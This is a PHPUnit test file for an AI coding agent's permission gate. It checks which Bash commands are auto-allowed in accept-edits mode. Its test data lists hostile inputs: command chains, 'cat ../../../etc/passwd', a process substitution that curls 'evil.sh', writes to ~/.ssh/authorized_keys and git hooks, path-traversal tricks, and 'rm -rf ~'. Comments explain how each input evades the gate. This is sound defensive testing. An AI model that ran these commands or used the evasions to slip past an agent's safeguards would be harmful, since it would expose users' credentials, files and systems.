<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Tests\Permissions;

use PHPUnit\Framework\TestCase;
use SugarCraft\Crush\Permissions\PermissionDecision;
use SugarCraft\Crush\Permissions\PermissionGate;
use SugarCraft\Crush\Permissions\PermissionMode;
use SugarCraft\Crush\ToolCall;

/**
 * The `accept-edits` grant path, both directions.
 *
 * DOMAIN: every assertion here is about {@see PermissionGate::evaluate()} under
 * {@see PermissionMode::AcceptEdits} and about `Bash` calls only. Nothing here
 * claims anything about the other five modes or about the declaration path
 * ({@see PermissionGate::refuses()}), which never carries a `command` argument
 * and therefore never reaches the scoped-write predicate at all.
 *
 * Every case in {@see evasionsThatMustPrompt()} auto-Allowed before the fix that
 * accompanies this file — they are regressions, not restatements. Every case in
 * {@see legitimateScopedWrites()} allowed before it and must still allow: a fix
 * that turns the whole mode into Ask has deleted the feature rather than secured
 * it, and that half of the suite is what pins the difference.
 *
 * ## Mutations that SURVIVE this file on purpose
 *
 * Recorded so the next reviewer does not have to re-derive them. Both were
 * re-applied and re-run against this file, not predicted.
 *
 * - **Dropping `$token !== '-'`** from the flag branch in
 *   {@see PermissionGate::isScopedWriteTool()}. Survives, and it FAILS
 *   CLOSED: `rmdir -p -` goes Allow -> Ask under it (MEASURED in its
 *   original `rm -rf -` spelling, before audit F-P4 took `rm` off the grant
 *   list), because the bare `-` is then judged as an unlisted flag instead of
 *   as a filename. A mutation that can only turn grants into prompts needs no
 *   test; pinning it would pin the leniency, not the safety.
 *
 * - **Dropping `(` and `)`** from {@see PermissionGate::SHELL_METACHARS}.
 *   Survives, and — correcting the obvious assumption — it does NOT fail
 *   closed: MEASURED, `mkdir (x)` goes Ask -> Allow under it. It is acceptable
 *   for a different reason, which is worth stating exactly because it is not
 *   the reason one expects: `mkdir (x)` is a SYNTAX ERROR in both bash and sh
 *   (verified in each), so the widened grant covers only strings no shell will
 *   execute. `(` and `)` cannot be tested individually at all — every real
 *   construct that uses one uses the other, plus a character already in the
 *   set. They are refused as a SET, and the process-substitution case above
 *   says so.
 *
 * ## The `*` decision depends on a constant in a file this class never reads
 *
 * `*` is deliberately NOT in {@see PermissionGate::SHELL_METACHARS}, and the
 * reasoning for that lives in {@see \SugarCraft\Crush\Permissions\WritePathScope::isContainedRelativePath()}.
 * It is correct ONLY because of how the approved command is eventually spawned.
 * MEASURED, writing STAR for the asterisk so this docblock does not close on
 * itself: the command `touch ./.?/victim` is Allowed here (and `cp` was, until
 * audit F-P4 took it off the grant list), and under
 * `/bin/sh` (dash) the fragment `./.?/` expands to `./../` — a real write,
 * and a real delete, outside the working directory. Under bash it does not,
 * because bash excludes `.` and `..` from glob results. (The first measured
 * spelling was `./.STAR/`; that one now prompts because `.STAR` can name
 * `.git` — audit F-J4 — so it no longer demonstrates the Allow.)
 *
 * {@see \SugarCraft\Crush\Tools\BuiltIn\Bash} wraps every command in `bash -c`,
 * which is what makes the Allow safe. That file is not this one's dependency
 * and this class never references it. **If that wrapper ever becomes `sh -c`,
 * leaving `*` out of the metacharacter set becomes a live grant escape.**
 * {@see testTheBashToolStillSpawnsThroughBashNotSh()} fails if it changes.
 */
final class PermissionGateScopedWriteTest extends TestCase
{
    private function decide(string $command): PermissionDecision
    {
        return (new PermissionGate(PermissionMode::AcceptEdits))->evaluate(
            new ToolCall(name: 'Bash', arguments: ['command' => $command]),
        );
    }

    /**
     * Command lines that reach past the single scoped write they open with.
     * Each auto-Allowed under the whitespace-only tokenizer.
     *
     * @return array<string, array{string}>
     */
    public static function evasionsThatMustPrompt(): array
    {
        return [
            // Chained second command: the separator was never a separator.
            // Each of these isolates ONE separator, and the payload after it is
            // built ONLY from contained relative tokens (`sh ./b`, not
            // `cat /etc/passwd`). Both halves are needed: a case carrying two
            // separators is still rejected when either is removed, and a case
            // whose payload holds an absolute or escaping path is still
            // rejected by the CONTAINMENT check when its separator is removed.
            // Mutation M1 (dropping `;` from the metacharacter set) SURVIVED
            // twice — once for each kind of masking — before these were
            // narrowed, so the shape below is load-bearing, not stylistic.
            // `sh ./b` is also the realistic danger: it runs an arbitrary
            // script that a `mkdir` grant was never asked to authorise.
            'semicolon chain'          => ['touch ./a; sh ./b'],
            'and-and chain'            => ['mkdir ./x && sh ./b'],
            'or-or chain'              => ['mkdir ./x || sh ./b'],
            'newline chain'            => ["mkdir ./x\nsh ./b"],
            'carriage return chain'    => ["mkdir ./x\rsh ./b"],
            'pipe'                     => ['mkdir ./x | sh'],
            'background ampersand'     => ['mkdir ./x & sh ./b'],
            // Kept in the absolute-payload spelling too: it is the shape a
            // real exfiltration takes, and it must be refused by the separator
            // rule rather than only by the containment rule.
            'chain to an abs path'     => ['mkdir ./x && cat ../../../etc/passwd'],
            // Input redirection, isolating `<` (the process-substitution case
            // below cannot, since it needs `<`, `(` and `)` together).
            'input redirect'           => ['mkdir ./x <./in'],
            // A DELIBERATE conservative refusal rather than a real exploit:
            // `!` is history expansion, which is interactive-only in most
            // shells, so this costs a prompt on a filename containing `!` and
            // buys not having to depend on how the Bash tool spawns its shell.
            // Pinned so the choice is a decision on record, not an accident.
            'bang in a filename'       => ['touch ./a!'],
            // Substitution: the command actually run is not the one we matched.
            'command substitution'     => ['touch $(whoami).txt'],
            'backtick substitution'    => ['mkdir `id`'],
            'substitution in dquotes'  => ['mkdir "$(cat /etc/hostname)"'],
            'backtick in dquotes'      => ['mkdir "`id`"'],
            // `$TARGET`, not `$HOME`: since audit F-P1 the rm -rf circuit
            // breaker normalises `$HOME` to the home directory and DENIES
            // `rm -rf $HOME` before mode dispatch, so that spelling no longer
            // reaches the `$` metacharacter refusal this case is pinning.
            'variable expansion'       => ['rmdir $TARGET'],
            // NOTE: this one cannot isolate a single character — `<`, `(` and
            // `)` are all in the set, so removing any one still leaves the
            // others to reject it. It pins the shape, not a specific
            // metacharacter, and the same is true of the brace case below.
            // MEASURED: a per-character mutation sweep over SHELL_METACHARS
            // killed |, &, ;, <, >, $, backtick, \n, \r and ! individually;
            // (, ), { and } survive alone because no shell construct uses
            // exactly one of a pair. They are refused as a SET, and that is the
            // honest description of what these two cases cover.
            'process substitution'     => ['touch <(curl https://evil.sh) ./x'],
            // Redirection writes a file the predicate never looked at.
            'output redirect'          => ['touch ./x >./out'],
            // Brace expansion can name the parent directory.
            'brace expansion escape'   => ['mkdir {.,..}/x'],
            // KILLS M15 (isAbsolutePath() losing its `~` clause). A tilde path
            // is not spelled with a leading `/`, so with that clause gone
            // `~/.ssh/authorized_keys` walks the containment loop as three
            // ordinary segments, reaches depth 3, and is judged CONTAINED.
            // MEASURED: Ask today, Allow under M15, and the 48-case suite that
            // preceded this line passed under M15 — nothing pinned the clause.
            //
            // The consequence is not theoretical: bash expands `~` before the
            // command ever runs, so an auto-approved `cp` writes an SSH
            // authorized_keys file in the invoking user's home directory. The
            // gate never expands it, which is exactly why the SPELLING has to
            // be refused rather than the resolved path judged.
            //
            // `touch` rather than `rm -rf ~` on purpose: the latter is caught
            // earlier by the rm -rf circuit breaker (Deny, not Ask), so it
            // would pass with the clause deleted and prove nothing here. (It
            // was `cp ./key ~/.ssh/authorized_keys` until audit F-P4 took `cp`
            // off the grant list, after which `cp` asks for a reason that has
            // nothing to do with the clause.)
            'tilde escapes to home'    => ['touch ~/.ssh/authorized_keys'],
            // KILLS M18 (dropping `\` from SHELL_METACHARS). Without it the
            // backslashes are ordinary characters, the token splits on `/` into
            // `.\`, `.\`, `PWNED` — none of which equals `..` — so the walk
            // reaches depth 3 and calls it contained. Bash reads `.\.` as an
            // escaped `.`, i.e. `..`, and writes TWO DIRECTORIES UP.
            // MEASURED: Ask today, Allow under M18, suite green under M18.
            //
            // This is the one metacharacter in the set that is not there to
            // stop a second command: it is there because an escape
            // desynchronises the quote scanner AND can forge a `..` out of
            // characters that are individually harmless.
            'backslash forges dotdot'  => ['touch .\./.\./PWNED'],
            // Relative, and outside the working directory anyway.
            'dotdot traversal'         => ['rmdir ../../../etc/x'],
            'dotdot in the middle'     => ['mkdir ./a/../../../tmp/pwned'],
            // Escapes and then re-descends, so the FINAL depth is positive.
            // Only the per-segment underflow guard rejects this one; mutation
            // M4 (deleting that guard) SURVIVED until this case existed.
            'escape then re-descend'   => ['mkdir ../sibling/x'],
            'escape then deep descend' => ['touch ./a ../../other/deep/dst'],
            // WHAT THIS CASE ACTUALLY PROVES, corrected. It was documented as
            // pinning the FLAG WHITELIST, and that rationale was wrong:
            // MEASURED by re-running mutation M7 ('pfirRvnd' -> 'pfirRvndt',
            // i.e. whitelisting -t), this case still returns Ask under the
            // mutation, because `../../etc` is caught by the CONTAINMENT check
            // regardless of how `-t` is classified. It pins the historical
            // shape of the bug — a flag value that escapes — and nothing more.
            // The whitelist itself is pinned by the case below, which uses a
            // CONTAINED value so containment cannot be what refuses it.
            //
            // Respelled with `touch -r` (a whitelisted letter that, for touch,
            // takes a REFERENCE FILE) after audit F-P4 took `mv` off the grant
            // list: the historical shape is the same — a flag value that
            // escapes — and only containment can refuse it.
            'dotdot via a flag value'  => ['touch -r ../../etc/passwd ./x'],
            // KILLS M7. `-t` is not on SCOPED_WRITE_SHORT_FLAGS, and every path
            // here is contained, so the ONLY thing that can refuse this line is
            // the whitelist. MEASURED: Ask today, Allow under M7 — and under
            // M7 the whole 48-case suite still passed, which is how a
            // presence-not-truth rationale survives review.
            //
            // Why it matters that an unlisted flag prompts even with a safe
            // value: the whitelist's job is to refuse flags whose SEMANTICS it
            // does not know. `-t` makes the FIRST path the destination
            // directory and the rest sources, inverting the argument shape the
            // containment loop assumes. Approving it because today's value
            // happens to be contained would be approving a parse this class
            // does not perform.
            //
            // Respelled after audit F-P4 (`mv` itself now asks, which would
            // mask the whitelist): `touch -c` is not on the list either, and
            // every operand is contained.
            'unlisted flag, safe value' => ['touch -c ./x'],
            // The working directory itself is not "something inside it".
            'removes the root itself'  => ['rmdir .'],
            'removes the root, slashed' => ['rmdir ./'],
            // Not `mkdir` on a case-sensitive filesystem.
            'uppercase command word'   => ['MKDIR ./x'],
            // A flag that takes a path must not be skipped as if it were a bool.
            'target-directory flag'    => ['touch --reference=../../etc/passwd ./x'],
            // Tokenization we cannot trust.
            'unterminated quote'       => ['mkdir "./x'],
        ];
    }

    /**
     * @dataProvider evasionsThatMustPrompt
     */
    public function testEvasionPrompts(string $command): void
    {
        $this->assertSame(
            PermissionDecision::Ask,
            $this->decide($command),
            "accept-edits must NOT auto-run: {$command}",
        );
    }

    /**
     * The behaviour `accept-edits` exists to provide. Every one of these is a
     * real single filesystem primitive contained in the working directory.
     *
     * @return array<string, array{string}>
     */
    public static function legitimateScopedWrites(): array
    {
        return [
            'mkdir dot-slash'      => ['mkdir ./build'],
            'mkdir bare relative'  => ['mkdir src/Controllers'],
            'mkdir -p'             => ['mkdir -p ./build/output'],
            'mkdir long flag'      => ['mkdir --parents ./build/output'],
            'touch'                => ['touch ./file'],
            'touch bare relative'  => ['touch tmp/demo.txt'],
            'touch two relatives'  => ['touch ./a ./b'],
            'rmdir'                => ['rmdir ./tmp'],
            'rmdir -p'             => ['rmdir -p ./tmp/a/b'],
            'clustered flags'      => ['mkdir -pv ./tmp'],
            'end of options'       => ['mkdir -- ./x'],
            'dotdot that returns'  => ['mkdir ./a/../b'],
            // Quote-awareness: neither of these is a chain or a second word.
            'semicolon in a name'  => ["touch 'a;b'"],
            'space in a name'      => ['mkdir "my dir"'],
        ];
    }

    /**
     * @dataProvider legitimateScopedWrites
     */
    public function testLegitimateScopedWriteStillAutoAllows(string $command): void
    {
        $this->assertSame(
            PermissionDecision::Allow,
            $this->decide($command),
            "accept-edits must still auto-run: {$command}",
        );
    }

    /**
     * Audit F-P4: the destructive verbs are no longer granted. Every row here
     * auto-ALLOWED before the fix — contained, single, flag-whitelisted — and
     * now asks, because `rm` deletes content and `cp`/`mv` overwrite their
     * destination. The edit tools carry the `accept-edits` grant instead
     * (see PermissionGateAcceptEditsTest).
     *
     * @return array<string, array{string}>
     */
    public static function destructiveVerbsThatNowPrompt(): array
    {
        return [
            'rm a source file'     => ['rm ./src/Main.php'],
            'rm -rf a subdir'      => ['rm -rf ./tmp'],
            'rm clustered flags'   => ['rm -rfv ./tmp'],
            'mv two relatives'     => ['mv ./a ./b'],
            'mv over a file'       => ['mv -f ./x ./src/Main.php'],
            'cp two relatives'     => ['cp ./a ./b'],
            'cp -r a tree'         => ['cp -r ./a ./b'],
        ];
    }

    /**
     * @dataProvider destructiveVerbsThatNowPrompt
     */
    public function testDestructiveShellVerbsPrompt(string $command): void
    {
        $this->assertSame(
            PermissionDecision::Ask,
            $this->decide($command),
            "accept-edits must ask before a destructive shell verb: {$command}",
        );
    }

    /**
     * The `rm -rf /` circuit breaker sits AHEAD of mode dispatch, so an evasion
     * that happens to spell it out is Deny rather than Ask. Pinned separately so
     * the Ask-vs-Deny distinction above is not quietly wrong for this one shape.
     */
    public function testChainEndingInRmRfHomeIsDeniedNotMerelyAsked(): void
    {
        $this->assertSame(PermissionDecision::Deny, $this->decide('mkdir ./x || rm -rf ~'));
    }

    /**
     * A command word is not scoped just because a scoped command's name appears
     * inside it — the predicate matches the whole first word.
     */
    public function testCommandSpelledWithAPathOrPrefixPrompts(): void
    {
        foreach (['/bin/mkdir ./x', './mkdir ./x', 'sudo mkdir ./x', 'env mkdir ./x'] as $command) {
            $this->assertSame(PermissionDecision::Ask, $this->decide($command), $command);
        }
    }

    /**
     * A flag-only invocation names no path, so there is nothing to prove
     * contained. It must not fall through to Allow on an empty path list.
     */
    public function testFlagsWithoutAnyPathPrompts(): void
    {
        $this->assertSame(PermissionDecision::Ask, $this->decide('mkdir -p'));
        $this->assertSame(PermissionDecision::Ask, $this->decide('rmdir -p'));
    }

    /**
     * Contained by spelling, but not an edit (audit F-J4). Every row auto-
     * Allowed before {@see \SugarCraft\Crush\Permissions\WritePathScope::PROTECTED_SEGMENTS}: the containment
     * check is lexical, and `./.git/hooks/pre-commit` is strictly below the
     * working directory. The first row is the finding — a hook that runs on
     * the user's next `git commit`, outside any sugar-crush mode.
     *
     * @return array<string, array{string}>
     */
    public static function repositoryAndPolicyPathsThatMustPrompt(): array
    {
        return [
            // Respelled with the create-only verbs after audit F-P4: the
            // original `cp`/`mv`/`rm` rows now ask because the VERB is no
            // longer granted, which would hide a regression in the segment
            // check. Each row below is contained, uses a granted verb, and is
            // refused only by the segment.
            'touch a pre-commit hook'      => ['touch ./.git/hooks/pre-commit'],
            'touch a post-checkout hook'   => ['touch .git/hooks/post-checkout'],
            'touch a pre-push hook'        => ['touch ./.git/hooks/pre-push'],
            'remove a .git subdirectory'   => ['rmdir ./.git/refs/tags'],
            'nested repository'            => ['mkdir ./sub/.git'],
            'the .git directory itself'    => ['rmdir ./.git'],
            'quoted segment'               => ['touch "./.git/hooks/pre-commit"'],
            'case-insensitive filesystem'  => ['touch ./.GIT/hooks/pre-commit'],
            'glob that names .git'         => ['touch ./.g*/hooks/pre-commit'],
            'single-char glob names .git'  => ['touch ./.gi?/hooks/pre-commit'],
            'policy dir'                   => ['mkdir ./.sugar-crush/agents'],
            'policy settings tier'         => ['touch ./.sugar-crush/settings.json'],
            'MCP server roster'            => ['touch ./.mcp.json'],
        ];
    }

    /**
     * @dataProvider repositoryAndPolicyPathsThatMustPrompt
     */
    public function testRepositoryAndPolicyPathsPrompt(string $command): void
    {
        $this->assertSame(
            PermissionDecision::Ask,
            $this->decide($command),
            "accept-edits must NOT auto-run a write into .git or policy: {$command}",
        );
    }

    /**
     * The segment match is exact (after glob semantics), not a prefix: these
     * names merely start like `.git` and are ordinary project files, and a
     * bare `*` cannot match a dotfile under bash, so `touch ./*` keeps its
     * grant.
     *
     * @return array<string, array{string}>
     */
    public static function lookalikesThatStillAutoAllow(): array
    {
        return [
            'touch two relatives (control)' => ['touch ./a ./b'],
            '.gitignore'                 => ['touch ./.gitignore'],
            '.github workflows'          => ['mkdir -p ./.github/workflows'],
            '.gitkeep in a subdir'       => ['touch ./src/.gitkeep'],
            'a name ending in git'       => ['mkdir ./widget'],
            'star does not name a dot'   => ['touch ./*'],
            'leading ? does not either'  => ['touch ./?git'],
        ];
    }

    /**
     * @dataProvider lookalikesThatStillAutoAllow
     */
    public function testLookalikesOfRepositoryPathsStillAutoAllow(string $command): void
    {
        $this->assertSame(
            PermissionDecision::Allow,
            $this->decide($command),
            "accept-edits must still auto-run: {$command}",
        );
    }

    /**
     * A missing or non-string `command` is not a scoped write. Guarded before
     * this change too; pinned because the tokenizer now dereferences it.
     */
    public function testAbsentOrNonStringCommandPrompts(): void
    {
        $gate = new PermissionGate(PermissionMode::AcceptEdits);

        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall(name: 'Bash', arguments: [])),
        );
        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall(name: 'Bash', arguments: ['command' => ['mkdir', './x']])),
        );
        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall(name: 'Bash', arguments: ['command' => '   '])),
        );
    }

    /**
     * A CROSS-FILE TRIPWIRE, not a test of this class.
     *
     * `PermissionGate` leaves the glob characters out of its metacharacter
     * set, so `touch ./.?/victim` is auto-Allowed under accept-edits.
     * That is safe only because {@see \SugarCraft\Crush\Tools\BuiltIn\Bash} spawns through `bash -c`, and
     * bash excludes `.` and `..` from glob results. MEASURED under `/bin/sh`
     * (dash), the same fragment expands to `./../` and the write lands one
     * directory up.
     *
     * So the gate's decision rests on a string in a file it never references
     * and does not depend on. Nothing else connects the two. This asserts the
     * wrapper is still `bash -c` by reading the source, which is crude but is
     * the only cheap way to fail when someone "simplifies" it to `sh -c`: the
     * alternative — executing a glob through the real tool — would need a
     * sandboxed worktree and a live filesystem write, which is a large amount
     * of machinery for a one-token invariant.
     *
     * DOMAIN: this proves the SPAWN STRING contains `bash -c`. It does not
     * prove `bash` resolves to bash on the host (on a system where `bash` is a
     * symlink to dash the premise fails and this test cannot see it). It is a
     * change-detector for the decision, not a proof of the shell.
     *
     * @see \SugarCraft\Crush\Tools\BuiltIn\Bash
     */
    public function testTheBashToolStillSpawnsThroughBashNotSh(): void
    {
        $source = file_get_contents(
            dirname(__DIR__, 2) . '/src/Tools/BuiltIn/Bash.php',
        );

        $this->assertIsString($source);
        $this->assertStringContainsString(
            '"bash -c "',
            $source,
            'Bash.php no longer spawns through `bash -c`. PermissionGate omits `*` '
            . 'from SHELL_METACHARS BECAUSE bash excludes . and .. from globs; under '
            . 'sh/dash `./.<star>/` expands to `./../` and the accept-edits grant '
            . 'becomes a write outside the working directory. Either restore the '
            . 'bash wrapper or add `*` to SHELL_METACHARS.',
        );
    }

    /**
     * The scoped-write grant is AcceptEdits-only. The same command must not
     * acquire an Allow in Default mode, where every write prompts.
     */
    public function testScopedWriteIsNotAllowedInDefaultMode(): void
    {
        $gate = new PermissionGate(PermissionMode::Default);

        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall(name: 'Bash', arguments: ['command' => 'mkdir ./build'])),
        );
    }
}
